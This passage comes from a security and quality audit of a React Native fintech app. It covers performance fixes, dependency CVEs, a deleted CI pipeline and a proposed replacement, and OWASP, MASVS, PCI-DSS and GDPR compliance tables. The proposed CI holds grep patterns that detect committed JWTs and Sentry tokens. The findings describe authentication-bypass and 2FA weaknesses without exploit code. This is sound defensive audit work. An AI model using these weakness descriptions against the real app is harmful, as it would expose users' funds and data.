The lists that matter most: transaction history ([TransactionHistory.tsx](src/screens/Crypto/cryptoCardTransations/TransactionHistory.tsx), [CryptoCardsTransaction.tsx](src/screens/Crypto/cryptoCardTransations/CryptoCardsTransaction.tsx)), notifications, address book, and chat messages — all of which can grow long.

**Recommended fix.** For lists with uniform row heights:
```tsx
const ITEM_HEIGHT = 72;
<FlatList
  data={transactions}
  keyExtractor={keyExtractor}
  renderItem={renderItem}                       // useCallback-wrapped
  getItemLayout={(_, index) => ({ length: ITEM_HEIGHT, offset: ITEM_HEIGHT * index, index })}
  initialNumToRender={10}
  maxToRenderPerBatch={10}
  windowSize={7}
  removeClippedSubviews={Platform.OS === "android"}
  updateCellsBatchingPeriod={50}
/>
```
Wrap `renderItem` in `useCallback` and the row component in `React.memo`. For variable-height rows, consider `@shopify/flash-list`, which handles this well and is a drop-in replacement for most cases.

---

### P-03 — Sparse Memoisation Relative to Codebase Size

**Severity:** 🟡 Medium

**Technical explanation.** Across 53,261 LOC:
- `useMemo`: **5 occurrences**
- `useCallback`: 38
- `React.memo`: 45

Five `useMemo` calls in a codebase this size means expensive derived values are recomputed on every render throughout. Combined with 1,081 `any` annotations (which prevent the compiler and the reader from reasoning about what changes), and screens of 2,000+ lines holding dozens of `useState` values, re-render cost is likely significant on the heaviest screens.

**Specific issues identified:**

1. **A function call in a dependency array** ([sendCryptoDetails.tsx:151](src/screens/Crypto/sendCryptoDetails.tsx#L151)):
   ```tsx
   useEffect(() => { /* … */ }, [sendAmmount, handleFee()])
   ```
   `handleFee()` executes on every render and its result is used as a dependency, causing redundant `getFeeDetails()` API calls.

2. **Object construction in render** ([chatscreen.tsx:44-56](src/screens/Chatbot/chatscreen.tsx#L44-L56)):
   ```tsx
   const config = { secretKey: '…', channelId: '…', accountId: '…' };
   const user = { id: …, name: decryptAES(userInfo?.userName), … };   // 4 decrypt calls
   const api = new KommoChatAPI(config.secretKey, config.channelId, config.accountId);
   ```
   A new `KommoChatAPI` instance and four `decryptAES` calls on **every render**. The decrypt cache ([useEncryption_Decryption.tsx:88](src/hooks/useEncryption_Decryption.tsx#L88)) mitigates the crypto cost — which is exactly what it was built for — but the object churn remains.

3. **Inline style arrays throughout.** `style={[commonStyles.fs16, commonStyles.textBlack, commonStyles.fw600]}` creates a new array on every render, defeating shallow-prop comparison in memoised children. This pattern appears thousands of times.

4. **Redux selectors returning fresh objects.** `useSelector((state: any) => state.UserReducer?.userInfo)` is fine (same reference), but `UserReducer` does `JSON.parse(JSON.stringify(action.payload))` on `USER_DETAILS` and `USER_INFO` ([UserReducer.js:20-36](src/redux/Reducer/UserReducer.js#L20-L36)) — a deep clone on every dispatch, which is both slow and produces a new reference each time.

**Recommended fix.**
1. Fix the dependency-array call: `const networkId = useMemo(() => handleFee(), [networkLu, selectedNetwork]);`
2. Memoise the chat API instance: `const api = useMemo(() => new KommoChatAPI(...), []);` and the `user` object with `useMemo` keyed on `userInfo`.
3. Hoist static style arrays out of render: `const titleStyle = [commonStyles.fs16, commonStyles.textBlack];` at module scope.
4. Remove the `JSON.parse(JSON.stringify(...))` deep clones in `UserReducer` — RTK's Immer already handles immutability for the slices, and the legacy reducer can simply spread.
5. Profile with the React DevTools Profiler on the heaviest screens (dashboard, KYC, card details) to target real hot spots rather than guessing.

---

### P-04 — Bundle Bloat from Redundant Libraries

**Severity:** 🟡 Medium · **Detail:** [L-02](#l-02--duplicated-and-redundant-dependencies)

**Estimated impact of consolidation:**

| Removal | Approximate JS/native saving |
|---|---|
| 2 of 3 chart libraries | Large — `victory-native@36` pulls the full D3 module set |
| `moment` + `moment-timezone` → `dayjs` | ~70 KB → ~2 KB (plus locale/tz data) |
| `react-native-elements` | Significant JS + native |
| `react-native-fs`, `react-native-splash-screen`, `react-native-signature-capture`, `react-native-push-notification` | Native module weight + **enables `enableJetifier=false`** |
| `base-64`, `crypto-js`, `hooks` | Small JS |
| x86/x86_64 ABIs dropped from release | Roughly halves native library size in a universal APK |

**Recommended fix.** Work through [L-02](#l-02--duplicated-and-redundant-dependencies) one package per PR. Additionally:
- Ship an **Android App Bundle (`.aab`)** so Play delivers only the needed ABI and density resources.
- Set `reactNativeArchitectures=armeabi-v7a,arm64-v8a` for release builds.
- Enable `shrinkResources true` alongside R8 ([C-08](#c-08--proguardr8-disabled-no-code-obfuscation)).
- Run `npx react-native-bundle-visualizer` to identify remaining large modules.

---

### P-05 — Network Inefficiency

**Severity:** 🟡 Medium · **Detail:** [M-11](#m-11--no-client-side-rate-limiting-fixed-interval-chat-polling), [M-03](#m-03--no-request-timeouts-or-retry-policy)

1. **Fixed 60-second chat polling** regardless of activity, with no background pause and no push-driven alternative despite FCM already delivering `"Support Chat"` messages.
2. **`getIpAddress()` called in the offline branch** ([M-10](#m-10--third-party-ip-geolocation-call-with-inverted-connectivity-logic)) — a guaranteed-failing request, plus a second unconditional call on mount.
3. **No request deduplication or caching.** `getMemberInfo()` is called from `useMemberLogin`, `sumsub.tsx`, and elsewhere with no shared cache; repeated navigation re-fetches.
4. **No timeouts** means hung requests hold resources indefinitely.
5. **No response caching** for slow-changing data (country/state lists are already bundled as JSON — good — but market data and lookup endpoints are re-fetched).

**Recommended fix.** Replace polling with push-triggered fetches; fix the connectivity branch; introduce a query cache (React Query / RTK Query) for deduplication, caching, and background refetch; add timeouts.

---

### P-06 — Oversized Screen Components

**Severity:** 🔵 Low (performance), 🟡 Medium (maintainability) · **Detail:** [L-08](#l-08--oversized-components-and-inconsistent-naming)

`addKycInfomation.tsx` (2,212 lines), `kycAddress.tsx` (2,193), and `editprofile.tsx` (1,824) each hold large numbers of `useState` hooks in a single component. Every state update re-renders the entire tree, including form fields unrelated to the change.

**Recommended fix.** Split into container + field-group components; move form state into Formik (already a dependency) which isolates field-level re-renders; extract API logic into hooks.

---

### P-07 — Startup Sequence Observations

**File:** [App.tsx:74-113](App.tsx#L74-L113)

Three separate `useEffect` hooks fire on mount, performing:
- `crashlytics().log()` + `AsyncStorage.getItem("theme")` + `initializeCrashlytics()`
- `checkVersionUpdate()` (network call) + `fcmNotification.initiate()` + `requestUserPermission()` + `RNBootSplash.hide()`
- `checkAppVersion()` keyed on `versionInfo`

`RNBootSplash.hide({ fade: true })` is called **immediately** in the second effect, before `checkVersionUpdate()` resolves — correct (the splash should not wait on network), but it means the version-check and permission prompt fire while the user is already interacting.

`requestUserPermission()` requests `POST_NOTIFICATIONS` on Android **and** calls `messaging().requestPermission()` on first launch, before any explanation — poor UX and a likely cause of high denial rates. The `if (enabled) { }` empty block indicates unfinished work.

**Recommended fix.** Defer the notification permission request to a contextual moment (e.g. after first successful login, with a rationale screen). Consolidate the three mount effects. Move `checkVersionUpdate` behind a short delay so it does not compete with the first render.

---

### 10.2 Performance Recommendations (prioritised)

| Priority | Action | Expected gain |
|---|---|---|
| 1 | Lazy-load screens in `AppContainer` ([P-01](#p-01--all-120-screens-statically-imported-at-startup)) | Large — cold start, memory |
| 2 | Consolidate redundant libraries ([P-04](#p-04--bundle-bloat-from-redundant-libraries)) | Large — bundle/APK size |
| 3 | Ship `.aab`, drop x86 ABIs, enable `shrinkResources` | Large — download size |
| 4 | Add FlatList tuning props ([P-02](#p-02--no-flatlist-virtualisation-tuning)) | Medium — scroll smoothness |
| 5 | Fix the `handleFee()` dependency and chat-screen object churn ([P-03](#p-03--sparse-memoisation-relative-to-codebase-size)) | Medium — redundant work |
| 6 | Replace chat polling with push ([P-05](#p-05--network-inefficiency)) | Medium — battery, data, server |
| 7 | Remove `JSON.parse(JSON.stringify())` deep clones in `UserReducer` | Medium — dispatch cost |
| 8 | Introduce a query cache (React Query / RTK Query) | Medium — redundant fetches |
| 9 | Split the 2,000-line screens ([P-06](#p-06--oversized-screen-components)) | Small perf, large maintainability |
| 10 | Profile and target real hot spots | — |

---

## 11. Architecture & Code Quality

### 11.1 Structure Assessment

```
src/
├── assets/          SVG icons + icon pack
├── components/      ~60 shared components (+ 6 subfolders)
├── config/          ⚠️ entirely commented out (L-01)
├── constants/       storage keys, theme, types
├── hooks/           19 custom hooks
├── navigation/      40 navigator files + AppContainer
├── redux/           ⚠️ legacy: Actions/Reducer/Store (L-01)
├── screens/         ~120 screens across 20 feature folders
├── services/        12 API service modules
├── store/           modern RTK slices + thunks
└── utils/           helpers, ApiService, api, tools, data
```

**What is done well:**
- **Clear feature-based screen organisation** — `Crypto/`, `Tlv_Cards/`, `Profile/`, `onBoarding/`, `Addressbook/` map cleanly to product areas.
- **Service layer separation** — all API calls go through [src/services/](src/services/) rather than being scattered in components. This is genuinely good and made this audit far easier.
- **Custom hooks** encapsulate cross-cutting concerns (`useEncryptDecrypt`, `useTokenRefresh`, `useLogOut`, `useMemberLogin`).
- **Shared style system** — `commonStyles`, theme JSON files, and a `scale.ts` for responsive sizing.
- **Schema-based validation** — Yup schemas colocated with their forms.
- **Excellent inline documentation** in the crypto modules and the RN upgrade work — the comments in [encryptionDecryption.tsx](src/utils/helpers/encryptionDecryption.tsx) and [gradle.properties](android/gradle.properties) explain *why*, not just *what*.

### 11.2 Issues

| Area | Assessment |
|---|---|
| **Separation of concerns** | ⚠️ Weak in screens — 2,000-line components mix UI, API, validation, navigation, and business logic. Strong in the service layer. |
| **State management** | ❌ **Two parallel systems.** Modern RTK slices in [src/store/](src/store/) coexist with a legacy action-types/reducer pattern in [src/redux/](src/redux/). The legacy `UserReducer` holds the most critical state (`userInfo` with `sk`, tokens, KYC flags). Two `store` files exist ([src/store/index.tsx](src/store/index.tsx) is live; [src/redux/Store/index.js](src/redux/Store/index.js) creates a second, unused store). |
| **SOLID** | ⚠️ Single Responsibility is the main violation (oversized screens). Dependency Inversion is reasonable — components depend on service abstractions, not on axios directly. |
| **Clean architecture** | ⚠️ No domain layer. Business rules (fee calculation, address validation, KYC gating) live in components and helpers rather than in a testable domain module. |
| **Error handling** | ❌ Inconsistent — [`isErrorDispaly`](src/utils/helpers/index.tsx#L538) is a good centralised mapper, but dozens of empty catches bypass it ([M-04](#m-04--silent-error-swallowing-throughout-the-codebase)). Two different error-formatting functions exist (`isErrorDispaly` and `formatError`). |
| **Logging** | ❌ No strategy — raw `console.*` in 20 files, Crashlytics over-collecting, Sentry disabled ([M-16](#m-16--excessive-console-logging-across-20-files), [C-07](#c-07--bearer-tokens-and-full-requestresponse-bodies-shipped-to-crashlytics), [M-12](#m-12--production-error-reporting-effectively-disabled)). |
| **Environment management** | ❌ **Broken** — [C-05](#c-05-getallenvdata-hard-returns-the-test-environment-for-every-build). No `.env`, no flavours, no build-time selection. |
| **Type safety** | ❌ 1,081 `any`; ~17 `tsc` errors; strict mode nominally on but defeated ([L-07](#l-07--typescript-strictness-not-enforced)). |
| **Naming** | ⚠️ Numerous misspellings in files and identifiers; mixed casing conventions ([L-08](#l-08--oversized-components-and-inconsistent-naming)). |
| **Code duplication** | ⚠️ Notable: logout logic duplicated in [useLogOut.tsx](src/hooks/useLogOut.tsx), [sumsub.tsx:196-215](src/components/sumsub.tsx#L196-L215), [DrawerMenu.tsx:133](src/components/DrawerMenu.tsx#L133), [phoneOtpVerification.tsx:243](src/screens/onBoarding/phoneOtpVerification.tsx#L243), and [rigistrationReferral.tsx:96](src/screens/onBoarding/rigistrationReferral.tsx#L96) — five near-identical implementations. `logOutLogData`/`loginLogData` duplicated across three files. Encryption implemented twice ([H-06](#h-06--unauthenticated-aes-cbc-and-a-legacy-zero-iv-decryption-fallback)). |
| **Dead code** | ❌ Nine unreferenced modules ([L-01](#l-01--dead-code-and-abandoned-modules)). |
| **Testing** | ❌ One failing smoke test ([L-05](#l-05--minimal-test-coverage)). |
| **Linting** | ❌ No config ([L-06](#l-06--no-eslint-configuration-despite-a-lint-script)). |

### 11.3 Architecture Recommendations

1. **Consolidate state management onto RTK.** Migrate `UserReducer` into a proper slice. This resolves the persist-whitelist confusion ([H-05](#h-05--redux-persist-encryption-transform-is-disabled)) and removes the deep-clone performance issue ([P-03](#p-03--sparse-memoisation-relative-to-codebase-size)). Delete [src/redux/Store/](src/redux/Store/) and [src/redux/Reducer/index.js](src/redux/Reducer/index.js).
2. **Extract a domain layer.** Move fee calculation, address validation, amount limits, and KYC state logic into pure, unit-testable modules under `src/domain/`. These are the rules that matter and they are currently untestable inside 2,000-line components.
3. **Deduplicate logout.** One `useLogout` hook, called from all five sites. The current duplication means [sumsub.tsx](src/components/sumsub.tsx#L196) does not call `clearDecryptCache()` while [useLogOut.tsx](src/hooks/useLogOut.tsx#L45) does — a real inconsistency with security implications.
4. **One error-handling path.** Merge `formatError` into `isErrorDispaly`; route every catch through it; ban empty catches via lint.
5. **One logging abstraction** ([M-16](#m-16--excessive-console-logging-across-20-files)).
6. **One storage abstraction** for sensitive data ([H-07](#h-07--auth-tokens-also-written-to-plaintext-asyncstorage)).
7. **One HTTP client** ([§7.4](#74-recommendations)).
8. **One crypto module** ([H-06](#h-06--unauthenticated-aes-cbc-and-a-legacy-zero-iv-decryption-fallback)).
9. **Delete dead code** ([L-01](#l-01--dead-code-and-abandoned-modules)).
10. **Establish ESLint + strict TypeScript as CI gates** ([L-06](#l-06--no-eslint-configuration-despite-a-lint-script), [L-07](#l-07--typescript-strictness-not-enforced)).

The recurring theme is **"one of each"** — the codebase currently has two state systems, two stores, two crypto implementations, two error formatters, three HTTP client sets, five logout implementations, three chart libraries, and two date libraries. Consolidation would address a large fraction of both the security and performance findings simultaneously.

---

## 12. Dependency Audit

### 12.1 Known Vulnerabilities

Full analysis in [H-12](#h-12--21-known-dependency-vulnerabilities-11-high-severity). Summary:

```
moderate: 10   high: 11   critical: 0   total: 21
```

**Runtime-reachable (priority):**
| Package | Issue | Path |
|---|---|---|
| `node-fetch <2.6.7` | CVE-2022-0235 — credential leak across redirects | `react-native-phone-number-input` → `react-native-country-picker-modal` → `modal-react-native-web` → `react-native-web` → `fbjs` → `isomorphic-fetch` → `node-fetch` |
| `d3-color 1.0.2–3.0.1` | CVE-2022-46175 — ReDoS | `victory-native` → `d3-*` |

**Build-time only (lower priority, but relevant to [VAPT-10](#vapt-10--supply-chain)):** `sharp`, `brace-expansion`, `fast-xml-parser`, `xcode`, `uuid`, `@expo/config-plugins`, `@react-native-community/cli*`.

### 12.2 Unmaintained / Deprecated

| Package | Version | Last activity | Risk |
|---|---|---|---|
| `redux-persist-keychain-storage` | 0.1.1 | ~2018 | **High** — handles all persisted credentials |
| `react-native-push-notification` | 8.1.1 | Archived | Medium — requires local patch; pre-AndroidX |
| `react-native-signature-capture` | 0.4.12 | Stale | Low — pre-AndroidX |
| `react-native-splash-screen` | 3.3.0 | Stale | Low — pre-AndroidX; redundant |
| `react-native-fs` | 2.20.0 | Stale | Low — redundant |
| `react-native-elements` | 3.4.3 | Superseded by `@rneui` | Low — redundant |
| `victory-native` | 36.9.2 | Legacy major line | Medium — CVE source |
| `hooks` | 0.3.2 | 2015 | Low — appears accidental |
| `moment` / `moment-timezone` | 2.30.1 / 0.6.0 | Maintenance mode | Low — redundant with dayjs |
| `crypto-js` | 4.2.0 | Active but superseded here | Low |

### 12.3 Version Concerns

| Package | Concern |
|---|---|
| `react-native-modal` | `^14.0.0-rc.1` — a **release candidate** in production dependencies |
| `react-native-reanimated` | `4.5.3` pinned exactly ✅ (correct — see the `.gitignore` note about the RN 0.81 mismatch) |
| `react-native-worklets` | `0.11.3` pinned exactly ✅ |
| `react-native-screens` | `4.26.2` pinned + patched ✅ |
| `@react-native-cookies/cookies` | `6.2.1` pinned + patched ✅ |
| Most others | `^` ranges — acceptable, but security-relevant packages (`react-native-keychain`, `react-native-quick-crypto`, `@sentry/react-native`, `react-native-auth0`) should be pinned exactly |

### 12.4 Native Dependency Notes

- **Jetifier retained** (`android.enableJetifier=true`) solely for three pre-AndroidX libraries — documented in [gradle.properties](android/gradle.properties). Removing them unblocks its removal and cuts build time.
- **Three `patch-package` patches** must be re-verified on every dependency bump.
- **Sumsub SDK** is sourced from a custom Maven repo (`maven.sumsub.com`) and a custom CocoaPods spec repo (`github.com/SumSubstance/Specs.git`) — confirm both are pinned to specific versions and that the spec repo is fetched over HTTPS with verified commits.
- **CMake 3.31.6 and NDK 27.1.12297006** are force-applied to all subprojects — well-reasoned and documented.

### 12.5 Recommendations

1. `npm audit fix`, then address the `phone-number-input` chain by replacing that package.
2. Remove the 11 redundant packages ([L-02](#l-02--duplicated-and-redundant-dependencies)).
3. Replace `redux-persist-keychain-storage` with an in-house adapter ([H-05](#h-05--redux-persist-encryption-transform-is-disabled)).
4. Move `react-native-modal` off the RC.
5. Pin security-relevant packages exactly.
6. Add `npm audit --audit-level=high` as a **blocking** CI gate.
7. Add Dependabot/Renovate with grouped weekly PRs.
8. Generate an SBOM per release (`npm sbom --sbom-format cyclonedx`).
9. Add install-time malicious-package scanning (Socket.dev or equivalent) — relevant given [VAPT-10](#vapt-10--supply-chain).

---

## 13. DevOps & CI/CD Security

### 13.1 Current State: No CI/CD

The most recent commit on the audited branch is:

```
5f38f42 ci cd  romevd
 .github/workflows/android-build.yml | 102 ------------------------------------
 .github/workflows/ci.yml            |  49 -----------------
 .github/workflows/release.yml       |  67 -----------------------
 3 files changed, 218 deletions(-)
```

**All CI/CD was deleted** in the head commit (commit message appears to be "ci cd removed" with typos). The repository currently has **no automated build, test, lint, typecheck, audit, or release pipeline**. Builds and releases happen on developer workstations.

### 13.2 Analysis of the Deleted Pipeline

The pipeline that existed (added in `2fc7f30`, three days prior) was **thoughtfully written** and is worth restoring rather than rebuilding:

**`ci.yml`** — ran on PRs and pushes to `main`/`rn-0.83-upgrade`:
- ✅ Concurrency group with `cancel-in-progress`
- ✅ Node 20 with npm cache
- ✅ `npm ci` as a **blocking** step (correctly identified as catching lockfile/patch breakage)
- ⚠️ `typecheck`, `test`, and `lint` all `continue-on-error: true` — with **honest inline comments** documenting exactly why each was non-blocking (~17 TS errors, Jest `transformIgnorePatterns` misconfiguration, no ESLint config) and instructing to remove the flag once fixed. This is good engineering practice; the flags were a deliberate, documented temporary state.
- ❌ No `npm audit` step
- ❌ No secret scanning

**`release.yml`** — tag-triggered (`v*`):
- ✅ Reusable workflow composition
- ✅ Explicit minimal `permissions: contents: write`
- ✅ Auto-generated changelog from git history
- ✅ `armeabi-v7a,arm64-v8a` only for release (correctly excluding x86)
- ❌ **Published a debug-signed APK to public GitHub Releases**, with the changelog explicitly stating: *"Signed with the debug keystore — internal testing only, not Play Store ready."*

That last point is the critical one: the pipeline **distributed** APKs signed with the publicly-known debug key ([C-03](#c-03--release-builds-are-signed-with-the-committed-debug-keystore)). The awareness was documented; the control was not implemented. Every APK published through this pipeline should be considered compromised material.

### 13.3 Findings

| ID | Finding | Severity |
|---|---|---|
| **CI-01** | No CI/CD exists — no automated gates of any kind | 🟠 High |
| **CI-02** | Releases were published signed with a public debug key | 🔴 Critical (= [C-03](#c-03--release-builds-are-signed-with-the-committed-debug-keystore)) |
| **CI-03** | Signing key committed to the repository | 🔴 Critical (= [C-03](#c-03--release-builds-are-signed-with-the-committed-debug-keystore)) |
| **CI-04** | Sentry auth token committed; no CI secret management | 🔴 Critical (= [C-02](#c-02--sentry-organisation-auth-token-committed-to-the-repository)) |
| **CI-05** | No secret scanning — this audit found 5 committed secrets | 🟠 High |
| **CI-06** | No dependency audit gate | 🟠 High |
| **CI-07** | Quality gates were non-blocking (documented as temporary) | 🟡 Medium |
| **CI-08** | Builds now occur on developer machines holding the signing key | 🟠 High (= [VAPT-10](#vapt-10--supply-chain)) |
| **CI-09** | No environment separation in the build ([C-05](#c-05-getallenvdata-hard-returns-the-test-environment-for-every-build)) | 🔴 Critical |
| **CI-10** | No iOS pipeline at all | 🟡 Medium |

### 13.4 Recommended Pipeline

**Restore `ci.yml`** with the quality gates fixed and made blocking, plus security steps:

```yaml
name: CI
on:
  pull_request:
  push:
    branches: [main, rn-0.83-upgrade]
concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: true

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with: { fetch-depth: 0 }

      - name: Secret scan
        uses: gitleaks/gitleaks-action@v2

      - name: Block hardcoded JWTs and known secret shapes
        run: |
          ! grep -rEn 'eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}' src/ App.tsx
          ! grep -rEn 'sntrys_[A-Za-z0-9+/=_-]{20,}' .
          ! grep -rn 'example\.org\|example\.com' src/

  checks:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: '20', cache: npm }
      - run: npm ci
      - run: npm audit --audit-level=high      # blocking
      - run: npx tsc --noEmit                  # blocking (after L-07 fixed)
      - run: npx jest --ci                     # blocking (after L-05 fixed)
      - run: npm run lint                      # blocking (after L-06 fixed)

  android-config-assertions:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Assert release hardening
        run: |
          grep -q 'enableProguardInReleaseBuilds = true' android/app/build.gradle
          grep -q 'android:networkSecurityConfig' android/app/src/main/AndroidManifest.xml
          ! grep -q 'signingConfig signingConfigs.debug' <(sed -n '/release {/,/}/p' android/app/build.gradle)
```

**Rewrite `release.yml`** to sign properly:

```yaml
  build:
    steps:
      - name: Restore keystore from secrets
        run: echo "${{ secrets.ANDROID_KEYSTORE_BASE64 }}" | base64 -d > /tmp/release.jks
      - name: Build signed bundle
        env:
          EXCHANGA_KEYSTORE_PATH:     /tmp/release.jks
          EXCHANGA_KEYSTORE_PASSWORD: ${{ secrets.ANDROID_KEYSTORE_PASSWORD }}
          EXCHANGA_KEY_ALIAS:         ${{ secrets.ANDROID_KEY_ALIAS }}
          EXCHANGA_KEY_PASSWORD:      ${{ secrets.ANDROID_KEY_PASSWORD }}
          SENTRY_AUTH_TOKEN:          ${{ secrets.SENTRY_AUTH_TOKEN }}
          APP_ENV:                    production
        run: cd android && ./gradlew bundleRelease
      - name: Wipe keystore
        if: always()
        run: shred -u /tmp/release.jks
```

### 13.5 Additional Recommendations

1. **Move all signing into CI.** No developer workstation should hold a release key.
2. **Enrol in Play App Signing** so Google holds the ultimate key and the upload key is rotatable.
3. **Add branch protection** on `main`: required reviews, required status checks, no force-push, signed commits.
4. **Add an iOS pipeline** (Fastlane + a macOS runner) with match/App Store Connect API key for certificate management.
5. **Publish to Play Internal Testing / TestFlight**, not to public GitHub Releases.
6. **Retain build provenance** — SBOM, mapping files, and dSYMs per release, stored as artefacts.
7. **Add a "no secrets" pre-commit hook** locally (`gitleaks protect --staged`) in addition to the CI gate.
8. **Rotate every secret found in this audit**, then enable GitHub push protection so the next one is blocked at push time.

---

## 14. Compliance & Best Practices

### 14.1 OWASP Mobile Top 10 (2024)

| # | Risk | Status | Findings |
|---|---|---|---|
| **M1** | Improper Credential Usage | ❌ **Fail** | [C-01](#c-01--live-kommo-hmac-secret-and-channel-credentials-hardcoded-in-shipped-javascript), [C-02](#c-02--sentry-organisation-auth-token-committed-to-the-repository), [C-04](#c-04--hardcoded-production-issuer-jwt-and-authentication-bypass-fallback), [C-06](#c-06--static-aes-128-key-used-as-both-key-and-iv-for-registration-encryption), [H-13](#h-13--hardcoded-auth0-client-ids-and-a-dead-password-grant-login-screen) |
| **M2** | Inadequate Supply Chain Security | ❌ **Fail** | [H-12](#h-12--21-known-dependency-vulnerabilities-11-high-severity), [C-03](#c-03--release-builds-are-signed-with-the-committed-debug-keystore), [§13](#13-devops--cicd-security) |
| **M3** | Insecure Authentication/Authorization | ❌ **Fail** | [C-04](#c-04--hardcoded-production-issuer-jwt-and-authentication-bypass-fallback), [H-14](#h-14--biometric-gate-is-client-side-navigation-only), [M-15](#m-15--no-session-inactivity-timeout-or-foreground-re-authentication), [VAPT-02](#vapt-02--authorisation-bypass--privilege-escalation) |
| **M4** | Insufficient Input/Output Validation | ⚠️ **Partial** | [H-10](#h-10--insecure-webview-configuration-in-the-2fa-withdrawal-flow), [M-05](#m-05--push-notification-body-used-directly-as-a-file-path), [L-09](#l-09--miscellaneous-observations) (address validation) |
| **M5** | Insecure Communication | ❌ **Fail** | [H-02](#h-02--network_security_configxml-exists-but-is-never-wired-into-the-manifest), [H-03](#h-03--no-certificate-pinning-on-either-platform), [M-14](#m-14--ios-ats-permits-local-networking) |
| **M6** | Inadequate Privacy Controls | ❌ **Fail** | [H-08](#h-08--sentry-session-replay-and-pii-collection-enabled), [C-07](#c-07--bearer-tokens-and-full-requestresponse-bodies-shipped-to-crashlytics), [M-10](#m-10--third-party-ip-geolocation-call-with-inverted-connectivity-logic), [§9](#9-ios-security-review) (empty privacy manifest) |
| **M7** | Insufficient Binary Protections | ❌ **Fail** | [C-08](#c-08--proguardr8-disabled-no-code-obfuscation), [C-03](#c-03--release-builds-are-signed-with-the-committed-debug-keystore), [H-04](#h-04--no-rootjailbreak-detection-or-device-attestation) |
| **M8** | Security Misconfiguration | ❌ **Fail** | [C-05](#c-05-getallenvdata-hard-returns-the-test-environment-for-every-build), [H-02](#h-02--network_security_configxml-exists-but-is-never-wired-into-the-manifest), [H-15](#h-15--firebase-configuration-files-committed-pointing-at-the-test-project), [M-08](#m-08--ios-entitlements-set-to-development-aps-environment) |
| **M9** | Insecure Data Storage | ❌ **Fail** | [H-05](#h-05--redux-persist-encryption-transform-is-disabled), [H-07](#h-07--auth-tokens-also-written-to-plaintext-asyncstorage), [H-11](#h-11--keychain-entries-stored-without-access-control-or-biometric-binding), [M-07](#m-07--financial-documents-written-to-world-readable-public-storage) |
| **M10** | Insufficient Cryptography | ❌ **Fail** | [C-06](#c-06--static-aes-128-key-used-as-both-key-and-iv-for-registration-encryption), [H-01](#h-01--pbkdf2-with-10-iterations-protecting-password-changes), [H-06](#h-06--unauthenticated-aes-cbc-and-a-legacy-zero-iv-decryption-fallback), [M-02](#m-02--idempotency-keys-use-a-non-cryptographic-hash-of-predictable-inputs) |

**Result: 0 of 10 fully passing; 1 partial.**

### 14.2 OWASP MASVS v2.0

| Control Group | L1 | L2 | Notes |
|---|---|---|---|
| **MASVS-STORAGE** | ❌ | ❌ | Weak Keychain options, disabled persist encryption, public downloads, tokens in telemetry |
| **MASVS-CRYPTO** | ❌ | ❌ | Static keys, 10-iteration PBKDF2, unauthenticated CBC, zero-IV fallback |
| **MASVS-AUTH** | ❌ | ❌ | Hardcoded JWT, client-side biometrics, no session timeout, no step-up auth |
| **MASVS-NETWORK** | ❌ | ❌ | Config not applied, no pinning, WebView unrestricted |
| **MASVS-PLATFORM** | ⚠️ | ❌ | Good: `allowBackup=false`, minimal exported components. Bad: WebView config, push path traversal, no screenshot protection |
| **MASVS-CODE** | ❌ | ❌ | 21 dependency CVEs, no lint, minimal tests, debug code in production |
| **MASVS-RESILIENCE** | ❌ | ❌ | No obfuscation, no root detection, no attestation, no integrity checks, debug signing |
| **MASVS-PRIVACY** | ❌ | ❌ | Session replay, PII in telemetry, empty iOS privacy manifest, third-party IP disclosure |

**Result: MASVS-L1 not met. MASVS-L2 (expected for financial apps) not met.**

### 14.3 PCI-DSS Mobile Considerations

The app displays full card PAN, CVV, and PIN ([CardDetails.tsx](src/screens/Tlv_Cards/CardDetails.tsx), [showPin.tsx](src/screens/Tlv_Cards/showPin.tsx)), placing it in scope for PCI-DSS mobile guidance.

| Requirement | Status | Finding |
|---|---|---|
| **Req. 3.2** — Do not store SAD after authorisation | ❌ **Fail** | CVV/PIN captured in Crashlytics logs ([C-07](#c-07--bearer-tokens-and-full-requestresponse-bodies-shipped-to-crashlytics)) and potentially in session replay ([H-08](#h-08--sentry-session-replay-and-pii-collection-enabled)) and OS snapshots ([H-09](#h-09--no-screenshot--screen-recording-protection)) |
| **Req. 3.4** — Render PAN unreadable | ❌ **Fail** | Full PAN displayed and capturable; masking helpers exist but the reveal is unprotected |
| **Req. 4** — Encrypt transmission | ⚠️ **Partial** | HTTPS yes; no pinning ([H-03](#h-03--no-certificate-pinning-on-either-platform)); registration data weakly encrypted ([C-06](#c-06--static-aes-128-key-used-as-both-key-and-iv-for-registration-encryption)) |
| **Req. 6.2** — Patch known vulnerabilities | ❌ **Fail** | 21 open ([H-12](#h-12--21-known-dependency-vulnerabilities-11-high-severity)) |
| **Req. 6.3** — Secure development | ❌ **Fail** | No lint, no tests, no CI, secrets in source |
| **Req. 8.2.8** — Re-authenticate after 15 min idle | ❌ **Fail** | No inactivity timeout ([M-15](#m-15--no-session-inactivity-timeout-or-foreground-re-authentication)) |
| **Req. 8.3** — MFA | ⚠️ **Partial** | 2FA exists for withdrawals but is bypassable ([H-10](#h-10--insecure-webview-configuration-in-the-2fa-withdrawal-flow)) |
| **Req. 10** — Logging and monitoring | ❌ **Fail** | Sentry disabled ([M-12](#m-12--production-error-reporting-effectively-disabled)); over-logging to Crashlytics; no security event monitoring |

### 14.4 GDPR / Data Protection

| Article | Status | Concern |
|---|---|---|
| **Art. 5(1)(c)** — Minimisation | ❌ | Full request/response bodies and bearer tokens sent to two processors |
| **Art. 5(1)(f)** / **Art. 32** — Integrity & confidentiality | ❌ | Real KYC data likely in a test environment ([C-05](#c-05-getallenvdata-hard-returns-the-test-environment-for-every-build)); weak crypto; no pinning |
| **Art. 6** — Lawful basis | ⚠️ | No consent mechanism for analytics/crash/replay collection |
| **Art. 13/14** — Transparency | ⚠️ | `ipinfo.io` disclosure undeclared |
| **Art. 28** — Processors | ⚠️ | Confirm DPAs exist for Sentry, Google (Firebase), Kommo, Sumsub, ipinfo.io |
| **Art. 33** — Breach notification | ⚠️ | The committed Sentry token and test-environment KYC data may already constitute reportable incidents — **engage your DPO** |
| **Art. 35** — DPIA | ❌ | Session replay of financial screens would require a DPIA |

### 14.5 Fintech-Specific Standards

| Expectation | Status |
|---|---|
| Strong Customer Authentication (PSD2) | ❌ Client-side biometrics, bypassable 2FA |
